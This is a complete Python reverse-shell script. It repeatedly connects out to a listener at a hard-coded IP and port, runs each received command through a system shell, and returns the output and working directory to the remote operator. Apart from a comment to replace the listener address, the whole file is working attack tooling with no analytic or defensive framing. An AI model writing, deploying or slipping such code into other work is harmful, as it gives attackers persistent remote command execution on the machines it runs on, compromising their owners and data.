#!/usr/bin/env python3
import socket
import subprocess
import os
import time

# Replace with the IP and port of your listener
SERVER_HOST = "192.168.10.246"
SERVER_PORT = 8080

def connect_to_server():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((SERVER_HOST, SERVER_PORT))
                shell(sock)
        except Exception:
            time.sleep(5)  # Retry connection every 5 seconds

def shell(sock):
    while True:
        try:
            command = receive_command(sock)
            if not command:
                break

            if command.strip().lower() == "disconnect":
                break

            # Handle 'cd' command separately
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    result = ""
                except Exception as e:
                    result = f"cd error: {str(e)}\n"
            else:
                result = run_command(command)

            prompt = os.getcwd() + " > "
            sock.sendall(result.encode("utf-8") + prompt.encode("utf-8"))

        except Exception:
            break  # Exit on any error

def receive_command(sock):
    try:
        data = b""
        while True:
            part = sock.recv(1024)
            if not part:
                return None
            data += part
            if b"\n" in part or b"\r\n" in part:
                break
        return data.decode("utf-8", errors="replace").strip()
    except Exception:
        return None

def run_command(command):
    try:
        output = subprocess.check_output(
            command,
            stderr=subprocess.STDOUT,
            shell=True,
            timeout=10
        )
        return output.decode("utf-8", errors="replace")
    except subprocess.CalledProcessError as e:
        return e.output.decode("utf-8", errors="replace")
    except Exception as e:
        return f"Command error: {str(e)}\n"

if __name__ == "__main__":
    connect_to_server()
